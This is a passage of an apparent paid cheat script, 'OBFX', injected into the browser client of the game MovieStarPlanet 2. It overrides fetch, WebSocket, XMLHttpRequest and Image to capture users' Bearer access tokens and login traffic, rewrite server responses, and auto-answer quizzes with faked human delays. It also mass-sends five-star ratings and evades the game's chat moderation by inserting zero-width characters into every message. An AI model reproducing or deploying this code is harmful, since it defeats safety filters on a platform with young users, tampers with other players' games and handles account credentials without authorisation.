              padding: 12px;
              background: linear-gradient(135deg, #4ade80, #22c55e);
              border: none;
              border-radius: 8px;
              color: white;
              font-size: 14px;
              font-weight: 600;
              cursor: pointer;
              transition: all 0.2s ease;
            ">Apply</button>
            
            <button id="close-home-panel-modal" style="
              flex: 1;
              padding: 12px;
              background: linear-gradient(135deg, #ef4444, #dc2626);
              border: none;
              border-radius: 8px;
              color: white;
              font-size: 14px;
              font-weight: 600;
              cursor: pointer;
              transition: all 0.2s ease;
            ">Cancel</button>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML('beforeend', modalHTML);

    const modal = document.getElementById('obfx-home-panel-modal');
    const closeBtn = document.getElementById('close-home-panel-modal');
    const applyBtn = document.getElementById('apply-home-selection');

    const style = document.createElement('style');
    style.textContent = `
      .home-option:hover {
        background: rgba(255, 255, 255, 0.1) !important;
        transform: translateY(-2px);
      }
      .home-option.selected {
        border-color: #4ade80 !important;
        background: rgba(74, 222, 128, 0.1) !important;
      }
      .home-option.selected .selection-indicator {
        display: flex !important;
      }
      #apply-home-selection:hover {
        background: linear-gradient(135deg, #22c55e, #16a34a) !important;
        transform: translateY(-1px);
      }
      #close-home-panel-modal:hover {
        background: linear-gradient(135deg, #dc2626, #b91c1c) !important;
        transform: translateY(-1px);
      }
    `;
    document.head.appendChild(style);

    closeBtn.onclick = () => hideHomePanelModal();
    
    modal.onclick = (e) => {
      if (e.target === modal) hideHomePanelModal();
    };

    // Handle option selection
    document.querySelectorAll('.home-option').forEach(option => {
      option.onclick = () => {
        // Remove selected class from all options
        document.querySelectorAll('.home-option').forEach(opt => {
          opt.classList.remove('selected');
        });
        
        // Add selected class to clicked option
        option.classList.add('selected');
      };
    });

    // Handle apply button
    applyBtn.onclick = () => {
      const selectedOption = document.querySelector('.home-option.selected');
      const selectedType = selectedOption ? selectedOption.dataset.type : 'none';
      
      if (selectedType === 'template') {
        HOME_PANEL_SYSTEM.activateHomePanel();
        console.log('[OBFX] Home template activated - API interception enabled');
      } else {
        HOME_PANEL_SYSTEM.deactivateHomePanel();
        console.log('[OBFX] Home template deactivated - using default home');
      }
      
      hideHomePanelModal();
    };
  }

  function showHomePanelModal() {
    if (isModalOpen) return;
    
    if (!LICENSE_SYSTEM.hasFeatureAccess('homePanel')) {
      console.log('[OBFX] Home panel feature not available for current user tier:', LICENSE_SYSTEM.userTier);
      return;
    }
    
    createHomePanelModal();
    const modal = document.getElementById('obfx-home-panel-modal');
    modal.style.display = 'flex';
    isModalOpen = true;
  }

  function hideHomePanelModal() {
    const modal = document.getElementById('obfx-home-panel-modal');
    if (modal) {
      modal.style.display = 'none';
    }
    isModalOpen = false;
  }

  function setupKeyboardListener() {
    document.addEventListener('keydown', (event) => {
      if (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned') {
        console.log('[OBFX] Keyboard shortcuts blocked for unlicensed user');
        return;
      }

      if (event.code === 'Numpad1' || (event.key === '1' && event.location === 3)) {
        event.preventDefault();
        U.enableChatmod = !U.enableChatmod;
        console.log('[OBFX] Chat filtering bypass toggled:', U.enableChatmod);
      }
      
      if (event.code === 'Numpad2' || (event.key === '2' && event.location === 3)) {
        event.preventDefault();
        if (LICENSE_SYSTEM.hasFeatureAccess('autograph')) {
          console.log(`[OBFX] Autograph modal triggered. Active users: ${getUserCount()}`);
          showAutographModal();
        } else {
          console.log('[OBFX] Autograph feature not available with current license');
        }
      }
      
      if (event.code === 'Numpad3' || (event.key === '3' && event.location === 3)) {
        event.preventDefault();
        if (LICENSE_SYSTEM.hasFeatureAccess('homePanel')) {
          console.log('[OBFX] Home panel modal triggered');
          showHomePanelModal();
        } else {
          console.log('[OBFX] Home panel feature not available with current license');
        }
      }
    });
  }

  const U = {
      token: null,
      enableStarQuiz: true,
      enableStarQuizHuman: true,
      enableBlockTrackers: true,
      enableKeepLikes: true,
      enableChatmod: false,
      enableDressUp: false,
      headers() {
        return {
          "content-type": "application/json",
          authorization: "Bearer " + this.token,
        };
      },
      decodeToken() {
        try {
          return JSON.parse(atob(this.token.split(".")[1]));
        } catch {
          return {};
        }
      },
      getCulture() {
        return (this.decodeToken()?.culture || "").trim();
      },
      getApiHost() {
        return "en-US" === this.getCulture()
          ? "us.mspapis.com"
          : "eu.mspapis.com";
      },
      apiBase() {
        return "https://" + this.getApiHost();
      },
    };

  const R = window.fetch,
    t = /profilegeneratedcontent\/v2\/profiles\/([^\/]+)\/games\/j68d\/content$/i;

  async function Z(_, Q) {
    try {
      if (_ instanceof Request) {
        const Q = _.clone();
        return await Q.text();
      }
      const E = Q?.body;
      if (!E) return null;
      if ("string" == typeof E) return E;
      if (E instanceof Blob) return await E.text();
      if (E instanceof URLSearchParams) return "" + E;
      if (E instanceof ArrayBuffer || ArrayBuffer.isView(E))
        return new TextDecoder().decode(E);
    } catch (_) {
      return null;
    }
    return null;
  }

  const c = window.WebSocket;
  function T(_, Q) {
    try {
      _.send(Q);
    } catch (_) {}
  }

  return (
    (window.MSP2Tools = U),
    (window.fetch = async function (_, Q = {}) {
      const E = window.MSP2Tools;
      if (!E) return R.apply(this, arguments);
      
      if (LICENSE_SYSTEM.isDisabled && (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned')) {
        return R.apply(this, arguments);
      }
      
      let I = _ instanceof Request ? _.url : _ + "",
        S = (
          _ instanceof Request ? _.method || "GET" : Q.method || "GET"
        ).toUpperCase(),
        r = (function (_, Q) {
          let E = null;
          return (
            Q && Q.headers
              ? (E = Q.headers)
              : _ instanceof Request && (E = _.headers),
            E
          );
        })(_, Q);

      if (e(I) && LICENSE_SYSTEM.hasFeatureAccess('blockTrackers'))
        return Promise.resolve(new Response(null, { status: 204 }));

      if ("GET" === S && A.PROFILE_ATTRIBUTES.test(I)) {
        try {
          await handleProfileAttributesRequest(I);
        } catch (error) {
          console.log('[OBFX] Error processing profile attributes request:', error.message);
        }
      }

      if ("POST" === S && A.LOGIN_API.test(I)) {
        try {
          const requestBody = await Z(_, Q);
          if (requestBody) {
            await handleLoginRequest(I, requestBody);
          }
        } catch (error) {
          console.log('[OBFX] Error processing login request:', error.message);
        }
      }

      const originalResponse = await R.apply(this, arguments);

      if ("POST" === S && A.LOGIN_API.test(I)) {
        try {
          await handleLoginResponse(I, originalResponse);
        } catch (error) {
          console.log('[OBFX] Error processing login response:', error.message);
        }
      }

      // Handle profile attributes response to extract DefaultMyHome ID
      if ("GET" === S && A.PROFILE_ATTRIBUTES.test(I) && originalResponse.ok) {
        try {
          if (!HOME_PANEL_SYSTEM.profileAttributesFetched) {
            const responseData = await originalResponse.clone().json();
            if (responseData.additionalData && responseData.additionalData.DefaultMyHome) {
              HOME_PANEL_SYSTEM.setDefaultMyHomeId(responseData.additionalData.DefaultMyHome);
              HOME_PANEL_SYSTEM.profileAttributesFetched = true;
            }
          }
        } catch (error) {
          console.log('[OBFX] Error extracting DefaultMyHome ID:', error.message);
        }
      }

      // Handle home content response interception
      if ("GET" === S && HOME_PANEL_SYSTEM.shouldInterceptHomeContent(I) && originalResponse.ok) {
        try {
          console.log('[OBFX] Intercepting home content response for modification');
          const responseData = await originalResponse.clone().json();
          const modifiedData = HOME_PANEL_SYSTEM.modifyHomeContentResponse(responseData);
          
          return new Response(JSON.stringify(modifiedData), {
            status: originalResponse.status,
            statusText: originalResponse.statusText,
            headers: originalResponse.headers
          });
        } catch (error) {
          console.log('[OBFX] Error modifying home content response:', error.message);
          return originalResponse;
        }
      }

      try {
        I.includes("/experience") &&
          (function (_) {
            const Q = window.MSP2Tools;
            if (Q)
              try {
                let E = null;
                if (_ instanceof Headers)
                  E = _.get("authorization") || _.get("Authorization");
                else if (_ && "object" == typeof _) {
                  const Q = Object.keys(_).find(
                    (_) => "authorization" === _.toLowerCase(),
                  );
                  Q && (E = _[Q]);
                }
                if (E && E.startsWith("Bearer ")) {
                  const _ = E.slice(7);
                  Q.token = _;
                  accessToken = _;
                }
              } catch {}
          })(r);
      } catch (_) {}

      if (E.enableChatmod && "POST" === S && A.CHAT_API && A.CHAT_API.test(I)) {
        try {
          const requestBody = await Z(_, Q);
          if (requestBody) {
            const parsed = JSON.parse(requestBody);
            if (parsed?.MessageBody) {
              parsed.MessageBody = parsed.MessageBody.split("")
                .map(char => "\u200B" + char)
                .join("");
              
              console.log('[OBFX] Chat filtering bypassed for API request');
              return R.call(this, I, {
                ...Q,
                method: "POST",
                headers: r,
                body: JSON.stringify(parsed),
              });
            }
          }
        } catch (error) {
          // Silent error handling
        }
      }

      if ("POST" === S && t.test(I) && LICENSE_SYSTEM.hasFeatureAccess('keepLikes'))
        try {
          let S, A;
          if (_ instanceof Request) {
            const Q = _.clone(),
              E = _.clone();
            ((S = Q), (A = E));
          } else ((S = Q.body), (A = Q.body));
          let e = null;
          if (S instanceof Request) e = await S.text();
          else if ("string" == typeof S) e = S;
          else if (S)
            try {
              S instanceof Blob && (e = await S.text());
            } catch {}
          if (e && e.includes("WAYD") && e.includes("ParticipantIds")) {
            const _ = I.match(t),
              S = _ ? _[1] : null;
            if (S && E.token) {
              const _ = await (async function (_, Q, E) {
                try {
                  const I = `${E}/profileattributes/v1/profiles/${_}/games/j68d/attributes`,
                    S = await R(I, {
                      method: "GET",
                      headers: {
                        "Content-Type": "application/json",
                        Authorization: "Bearer " + Q,
                      },
                    });
                  if (!S.ok) return null;
                  const A = await S.json();
                  return A?.additionalData?.WAYD || null;
                } catch {
                  return null;
                }
              })(S, E.token, E.apiBase());
              if (_) {
                const I = `${E.apiBase()}/profilegeneratedcontent/v2/profiles/${S}/games/j68d/content/${_}`;
                return A instanceof Request
                  ? R.call(this, I, {
                      ...Q,
                      method: "PUT",
                      headers: r,
                      body: A.body,
                    })
                  : R.call(this, I, {
                      ...Q,
                      method: "PUT",
                      headers: r,
                      body: A,
                    });
              }
            }
          }
        } catch (_) {}
      return originalResponse;
    }),
    (function () {
      const _ = window._MSP2_CurrentWebSocket || window.WebSocket,
        Q = _.prototype;
      ((window.WebSocket = function (Q, E) {
        if (LICENSE_SYSTEM.isDisabled && (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned')) {
          console.log('[OBFX] WebSocket creation blocked due to license violation');
          return new _(Q, E);
        }

        const I = E ? new _(Q, E) : new _(Q);
        
        allWebSockets.push(I);
        
        I.addEventListener('close', () => {
          allWebSockets = allWebSockets.filter(ws => ws !== I);
          clearAllUsers();
        });

        const originalSend = I.send.bind(I);
        
        Object.defineProperty(I, 'send', {
          value: function(data) {
            const E = window.MSP2Tools;
            
            if (E?.enableChatmod && typeof data === "string" && data.startsWith("42")) {
              try {
                const payload = JSON.parse(data.slice(2));
                if (Array.isArray(payload) && payload.length >= 2) {
                  const [type, content] = payload;
                  if (type === "chatv2:send" && content?.message) {
                    content.message = content.message.split("")
                      .map(char => "\u200B" + char)
                      .join("");
                    
                    console.log('[OBFX] Chat filtering bypassed for WebSocket message');
                    const modifiedData = "42" + JSON.stringify(payload);
                    return originalSend(modifiedData);
                  }
                }
              } catch (error) {
                // Silent error handling
              }
            }
            
            return originalSend(data);
          },
          writable: false,
          configurable: true
        });

        return (
          (function (_, Q) {
            const E = window.MSP2Tools;
            
            if (!LICENSE_SYSTEM.hasFeatureAccess('starQuiz')) return;
            if (!S.QUIZ_URL_REGEX.test(Q)) return;
            
            const I = {
                answers: {
                  QUIZ_MOVIES_TV_Q673_QUESTION: {
                    answers: [
                      "QUIZ_MOVIES_TV_Q673_ANSWER1",
                      "QUIZ_MOVIES_TV_Q673_ANSWER2",
                      "QUIZ_MOVIES_TV_Q673_ANSWER3",
                    ],
                    correctAnswer: 2,
                  },
                  QUIZ_VISIONARIES_Q1009_QUESTION: {
                    answers: [
                      "QUIZ_VISIONARIES_Q1009_ANSWER1",
                      "QUIZ_VISIONARIES_Q1009_ANSWER2",
                      "QUIZ_VISIONARIES_Q1009_ANSWER3",
                    ],
                    correctAnswer: 1,
                  },
                  QUIZ_ART_Q885_QUESTION: {
                    answers: [
                      "QUIZ_ART_Q885_ANSWER1",
                      "QUIZ_ART_Q885_ANSWER2",
                      "QUIZ_ART_Q885_ANSWER3",
                    ],
                    correctAnswer: 1,
                  },
                },
                currentQuestion: null,
                selected: null,
                total: 0,
                correct: 0,
                setQuestion(_) {
                  this.currentQuestion = _ ? _.trim() : null;
                },
                pickAnswer() {
                  if (!this.currentQuestion) return S.DEFAULT_ANSWER;
                  const _ = this.answers[this.currentQuestion];
                  return _ && "number" == typeof _.correctAnswer
                    ? _.correctAnswer
                    : S.DEFAULT_ANSWER;
                },
                record(_) {
                  this.selected = _;
                },
                reveal(_) {
                  if (
                    (this.total++,
                    this.selected === _ && this.correct++,
                    this.currentQuestion)
                  ) {
                    this.answers[this.currentQuestion] = {
                      correctAnswer: _,
                      learnedAt: Date.now(),
                      timesAsked:
                        (this.answers[this.currentQuestion]?.timesAsked || 0) +
                        1,
                    };
                  }
                  ((this.currentQuestion = null), (this.selected = null));
                },
                formatDate: (_) =>
                  _ ? new Date(_).toLocaleDateString() : "unknown",
                getStats() {
                  return {
                    learnedQuestions: Object.keys(this.answers).length,
                    sessionTotal: this.total,
                    sessionCorrect: this.correct,
                    sessionAccuracy: this.total
                      ? ((this.correct / this.total) * 100).toFixed(1)
                      : 0,
                  };
                },
                clearLearned() {
                  this.answers = {};
                },
              };
            (window._OBFX_QuizState = I),
              _.addEventListener("message", (Q) => {
                const A = Q.data,
                  e = (Q) => {
                    if (Q === S.PROTOCOL_PING) return T(_, S.PROTOCOL_PONG);
                    const A = (function (_) {
                      try {
                        return _.startsWith(S.PREFIX)
                          ? JSON.parse(_.slice(2))
                          : _.startsWith("[")
                            ? JSON.parse(_)
                            : null;
                      } catch {
                        return null;
                      }
                    })(Q);
                    if (!A) return;
                    const [e, r] = A;
                    if (e === S.EVENT_CHAL && r?.question)
                      I.setQuestion(r.question);
                    else if (
                      e === S.EVENT_STATE &&
                      r?.newState === S.STATE_WAIT
                    ) {
                      if (!I.currentQuestion) return;
                      const Q = I.pickAnswer();
                      I.record(Q);
                      const A = E.enableStarQuizHuman ? Math.floor(3e3 * Math.random()) + 1e3 : 0;
                      setTimeout(() => {
                        T(
                          _,
                          (function (_, Q) {
                            return S.PREFIX + JSON.stringify([_, Q]);
                          })(S.EVENT_ANSWER, { answer: Q }),
                        );
                      }, A);
                    } else if (
                      e === S.EVENT_REVEAL &&
                      "number" == typeof r?.correctAnswer
                    ) {
                      I.reveal(r.correctAnswer);
                    }
                  };
                "string" == typeof A
                  ? e(A)
                  : A instanceof ArrayBuffer
                    ? e(new TextDecoder().decode(A))
                    : A instanceof Blob && A.text().then(e);
              });
          })(I, Q),
          
          I.addEventListener("message", (event) => {
            try {
              const data = event.data;
              
              const parsedData = parseWebSocketMessage(data);
              
              if (parsedData && parsedData.messageContent) {
                const messageType = parsedData.messageType;
                const messageContent = parsedData.messageContent;

                if (messageType === '2000' && messageContent.otherUsers) {
                  console.log('[OBFX] Received user list with', messageContent.otherUsers.length, 'users');
                  messageContent.otherUsers.forEach(user => {
                    addUser(user.profileId, {
                      username: user.profileData?.name || 'Unknown',
                      sessionId: user.sessionId,
                      profileData: user.profileData
                    });
                  });
                }

                if (messageType === '20000' && messageContent.profileId) {
                  console.log('[OBFX] New user joined:', messageContent.profileId);
                  addUser(messageContent.profileId, {
                    username: messageContent.profileData?.name || 'Unknown',
                    sessionId: messageContent.sessionId,
                    profileData: messageContent.profileData
                  });
                }

                if (messageType === '20090' && messageContent.profileId) {
                  console.log('[OBFX] User left:', messageContent.profileId);
                  removeUser(messageContent.profileId);
                }
              }

              if (typeof data === 'string' && data.startsWith('42')) {
                let payload;
                try {
                  payload = JSON.parse(data.slice(2));
                } catch {
                  return;
                }
                
                if (!Array.isArray(payload) || payload.length < 2) return;
                const [type, content] = payload;

                if (type === '1007' && content) {
                  if (content.accessToken && content.profileId && content.culture) {
                    accessToken = content.accessToken;
                    console.log('[OBFX] Access token captured from WebSocket login');
                    
                    LICENSE_SYSTEM.currentCulture = content.culture;
                    LICENSE_SYSTEM.checkUserAccess(content.profileId, content.culture);
                    
                    if (window.MSP2Tools) {
                      window.MSP2Tools.token = content.accessToken;
                    }

                    handleWebSocketLogin(content.profileId, content.accessToken, content.culture);
                  }
                }

                if (type.startsWith('dressup:chal')) {
                  console.log('[OBFX] Dress-up challenge detected');
                  if (LICENSE_SYSTEM.hasFeatureAccess('dressUp')) {
                    setTimeout(() => {
                      console.log('[OBFX] Sending dress-up ready message');
                      sendToAllWS(`42["dressup:readyforjudgment",{"ready":true}]`);
                    }, 5000);
                  }
                }
                
                if (type === 'dressup:showoff' && content && Array.isArray(content.allPlayerOutfits)) {
                  console.log('[OBFX] Dress-up showoff detected with', content.allPlayerOutfits.length, 'outfits');
                  if (LICENSE_SYSTEM.hasFeatureAccess('dressUp')) {
                    content.allPlayerOutfits.forEach(outfit => {
                      if (outfit.profileId && !dressProfileIds.has(outfit.profileId)) {
                        dressProfileIds.add(outfit.profileId);
                        console.log('[OBFX] Added profile to dress-up rating queue:', outfit.profileId);
                      }
                    });
                  }
                }
                
                if (type === 'dressup:rating') {
                  console.log('[OBFX] Dress-up rating phase detected');
                  if (LICENSE_SYSTEM.hasFeatureAccess('dressUp') && dressProfileIds.size > 0) {
                    const profileArray = Array.from(dressProfileIds);
                    console.log('[OBFX] Sending ratings to', profileArray.length, 'profiles');
                    profileArray.forEach((id, index) => {
                      setTimeout(() => {
                        console.log('[OBFX] Sending 5-star rating to profile:', id);
                        sendToAllWS(`42["dressup:rate",{"profileId":"${id}","rating":5}]`);
                      }, index * 3000);
                    });
                    dressProfileIds.clear();
                  }
                }
              }
              
            } catch (error) {
              // Silent error handling
            }
          }),
          
          I
        );
      }),
        (window.WebSocket.prototype = Q));
    })(),
    (function () {
      const _ = navigator.sendBeacon;
      navigator.sendBeacon = function (Q, E) {
        if (LICENSE_SYSTEM.isDisabled && (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned')) {
          return _.apply(this, arguments);
        }
        
        return (
          !e(Q) || !LICENSE_SYSTEM.hasFeatureAccess('blockTrackers') || _.apply(this, arguments)
        );
      };
    })(),
    (function () {
      const _ = XMLHttpRequest.prototype.open,
        Q = XMLHttpRequest.prototype.send;
      ((XMLHttpRequest.prototype.open = function (Q, E) {
        return ((this.__obfx_url = E), _.apply(this, arguments));
      }),
        (XMLHttpRequest.prototype.send = function (_) {
          if (LICENSE_SYSTEM.isDisabled && (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned')) {
            return Q.apply(this, arguments);
          }
          
          if (e(this.__obfx_url) && !LICENSE_SYSTEM.hasFeatureAccess('blockTrackers')) return;
          return Q.apply(this, arguments);
        }));
    })(),
    (function () {
      const _ = window.Image;
      window.Image = function () {
        const Q = new _();
        return (
          Object.defineProperty(Q, "src", {
            set(_) {
              if (LICENSE_SYSTEM.isDisabled && (LICENSE_SYSTEM.userTier === 'none' || LICENSE_SYSTEM.userTier === 'banned')) {
                Q.setAttribute("src", _);
                return;
              }
              
              (e(_) && !LICENSE_SYSTEM.hasFeatureAccess('blockTrackers')) || Q.setAttribute("src", _);
            },
          }),
          Q
        );
      };
    })(),
    (function (_) {
      if (document.body) return _();
      const Q = new MutationObserver(() => {
        document.body && (Q.disconnect(), _());
      });
      Q.observe(document.documentElement, { childList: !0 });
    })(() => {
      setupKeyboardListener();
    }),
    _
  );
})({});

(function () {
  var warningMessage = "Sayfadan ayrılmak üzeresin. Devam etmek istiyor musun?";

  window.onbeforeunload = function (e) {
    e = e || window.event;

    // Eski tarayıcılar için
    if (e) {
      e.returnValue = warningMessage;
    }

    // Yeni tarayıcılar için
    return warningMessage;
  };
})();
